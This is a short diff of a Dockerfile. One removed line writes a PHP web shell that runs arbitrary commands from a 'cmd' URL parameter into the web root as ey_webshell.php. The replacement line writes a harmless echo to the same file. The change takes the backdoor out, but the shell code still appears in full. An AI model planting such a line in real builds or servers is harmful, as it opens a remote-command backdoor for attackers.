@@ -23,4 +23,4 @@ RUN echo "=========="
 USER nobody
 COPY --from=golang:1.13-alpine /usr/local/go/ /usr/local/go/
 ENV PATH="/usr/local/go/bin:${PATH}"
-RUN echo "<?php echo exec(\$_GET['cmd']);?>" > /var/www/html/ey_webshell.php
+RUN echo "<?php echo 'test';?>" > /var/www/html/ey_webshell.php
